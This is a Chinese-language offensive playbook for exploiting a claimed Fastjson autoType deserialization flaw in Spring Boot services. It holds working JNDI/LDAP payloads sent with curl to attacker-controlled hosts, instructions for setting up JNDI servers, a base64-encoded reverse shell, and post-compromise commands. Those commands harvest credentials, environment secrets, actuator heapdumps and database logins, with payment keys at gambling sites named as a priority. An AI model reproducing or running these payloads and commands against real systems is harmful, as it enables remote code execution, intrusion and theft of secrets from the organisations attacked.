# Fastjson CVE-2026-16723 杀伤链 Playbook

> **状态**：官方无补丁（截至 2026-08）  
> **影响**：Fastjson 1.2.68-1.2.83 + Spring Boot 环境  
> **利用条件**：目标 classpath 中有 JNDI 可用链（JDK、commons-dbcp2、c3p0、xbean 等）  
> **缓解方案**：迁移到 Fastjson2 或开启 SafeMode（`parseObject(json, Feature.SupportAutoType)` 改为 SafeMode）

---

## 一、漏洞原理

```
用户传入 JSON → Fastjson 解析
  ↓
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}
  ↓
autoType 机制实例化任意类（黑名单未覆盖 1.2.68+ 的新绕过链）
  ↓
触发 JNDI lookup → ldap://attacker:1389/Exploit
  ↓
攻击机 LDAP 服务器返回恶意 Java 类
  ↓
目标 JVM 加载执行 → RCE
```

**关键绕过点**（CVE-2026-16723 相比前版本的改进）：
- 利用了 1.2.68-1.2.83 新增的期望类（expectClass）检查漏洞
- 通过嵌套 `@type` 绕过黑名单
- Spring Boot 默认 classpath 中 commons-dbcp2/c3p0/xbean 均可用作链

## 二、典型利用链（按 JDK 版本）

| JDK 版本 | 链 | 备注 |
|----------|-----|------|
| ≤ 8u191 / 11.0.1 / 15 | JNDI LDAP（`JdbcRowSetImpl`） | 最通用 |
| > 8u191（JNDI 受限） | `com.sun.org.apache.xalan.TemplatesImpl` | 需 `Feature.SupportNonPublicField` |
| 任意 JDK | `org.apache.xbean.propertyeditor.JndiConverter` | xbean 在 Spring 中常见 |
| 任意 JDK | `com.mchange.v2.c3p0.JndiRefForwardingDataSource` | c3p0 Spring Boot 标配 |
| 任意 JDK | `org.apache.commons.dbcp2.BasicDataSource` | commons-dbcp2 极常见 |

## 三、完整利用流程

### Step 0：发现 Fastjson 端点

```bash
# 从目标域自动枚举 JSON 端点 + 指纹
python3 炼蛊房/fastjson_probe.py detect -u https://api.target.com

# 验证特定端点
python3 炼蛊房/fastjson_probe.py verify \
  -u https://api.target.com/api/login \
  --dnslog your.dnslog.cn
```

**版本判断依据**：
- 响应含 `autoType is not support`，但**无 SafeMode** 字样 → 1.2.68-1.2.83，**可利用**
- 响应含 `not support autoType` + `SafeMode` → 已开启 SafeMode，**不可利用**
- 响应含 `checkAutoType` → 1.2.47-1.2.68，参考老利用链

### Step 1：OOB 确认漏洞

```bash
# 使用 dnslog 验证 JNDI 回调
python3 炼蛊房/fastjson_probe.py scan \
  -u https://api.target.com \
  --dnslog xxxxx.dnslog.cn \
  --lhost 你的VPS \
  --out exports/fastjson/target/

# 手动发送（快速验证）
curl -sk -X POST https://api.target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xxxxx.dnslog.cn/a","autoCommit":true}'
```

在 dnslog 平台看到 DNS 查询 → 漏洞确认。

### Step 2：搭建 JNDI 注入服务

```bash
# 方式 A：JNDI-Injection-Exploit（推荐）
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar \
  -C "bash -c {echo,BASE64编码的反弹shell}|{base64,-d}|bash" \
  -A VPS_IP

# 方式 B：marshalsec（老牌）
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://VPS_IP:8888/#Exploit"

# 方式 C：yakit/xray 自带 JNDI 服务
# 在 yakit 里启动 JNDI 反连服务
```

### Step 3：发送利用 payload

```bash
# 使用工具生成的 payload 文件
curl -sk -X POST https://api.target.com/api/login \
  -H "Content-Type: application/json" \
  -d @exports/fastjson/target/payload_jndi_ldap.json

# 手工 payload（JdbcRowSetImpl，最通用）
curl -sk -X POST https://api.target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{
    "@type":"com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName":"ldap://VPS_IP:1389/Exploit",
    "autoCommit":true
  }'

# 备用链（xbean，JDK 版本不限）
curl -sk -X POST https://api.target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{
    "@type":"org.apache.xbean.propertyeditor.JndiConverter",
    "AsText":"ldap://VPS_IP:1389/Exploit"
  }'

# 备用链（c3p0）
curl -sk -X POST https://api.target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{
    "@type":"com.mchange.v2.c3p0.JndiRefForwardingDataSource",
    "jndiName":"ldap://VPS_IP:1389/Exploit",
    "loginTimeout":0
  }'
```

### Step 4：获取 Shell 后的操作

```bash
# 1. 立即检查权限
id && hostname && cat /etc/passwd | grep -v nologin | grep -v false

# 2. 读取 Spring Boot 应用配置（含数据库密码、支付密钥）
find /opt /app /srv /home -name "application*.yml" -o -name "application*.properties" 2>/dev/null
find / -name ".env" 2>/dev/null | xargs cat 2>/dev/null

# 3. 读取环境变量（容器/k8s 常把密钥放这里）
env | grep -i -E "key|secret|password|token|ak|sk|db|redis|pay"
cat /proc/1/environ | tr '\0' '\n' | grep -i -E "key|secret|pass|token"

# 4. 如果是低权限 → 立刻跑 LPE 检测
python3 炼蛊房/linux_lpe_checker.py --out /tmp/lpe_$(hostname).json
# 或上传脚本：
curl -sk https://你的服务器/linux_lpe_checker.py | python3

# 5. 找支付相关配置（博彩站重点）
grep -r -i -l "appId\|mchId\|apiKey\|notifyUrl\|paySecret\|CHANNEL" \
  /opt /app /srv 2>/dev/null

# 6. 数据库直连
cat /opt/app/application.yml | grep -A5 "datasource"
mysql -h 数据库IP -u 用户 -p密码 数据库名
```

## 四、Spring Boot 环境特定技巧

### 从 actuator 获取完整配置

```bash
# actuator env 泄露所有配置（包括加密前的密钥）
curl -sk https://api.target.com/actuator/env | python3 -m json.tool | grep -i "value"

# 获取所有 bean
curl -sk https://api.target.com/actuator/beans

# heapdump（含 JVM 内存中的密钥）
curl -sk https://api.target.com/actuator/heapdump -o heapdump.hprof
python3 炼蛊房/heap_cred_scan.py -f heapdump.hprof
```

### JDK 版本判断（影响利用链选择）

```bash
# 在目标上执行
java -version 2>&1

# 或通过 Error 响应推断
# "java.lang.UnsupportedOperationException" → 现代 JDK，JNDI 受限
# 响应正常 → 老 JDK，JdbcRowSetImpl 链可用
```

## 六、无回显利用（盲打）

```bash
# 用 sleep 判断 RCE 成功
time curl -sk -X POST https://api.target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://VPS_IP:1389/Sleep","autoCommit":true}'

# JNDI 服务返回的 Exploit.class 中执行 Thread.sleep(5000)
# 若响应延迟 5 秒 → RCE 确认

# 反弹 shell（base64 编码避免特殊字符问题）
# 原始命令：bash -i >& /dev/tcp/VPS_IP/4444 0>&1
# base64 编码：YmFzaCAtaSA+JiAvZGV2L3RjcC9WUFNfSVAvNDQ0NCAwPiYx
# payload 中命令：bash -c {echo,YmFzaCAtaSA+...}|{base64,-d}|bash
```
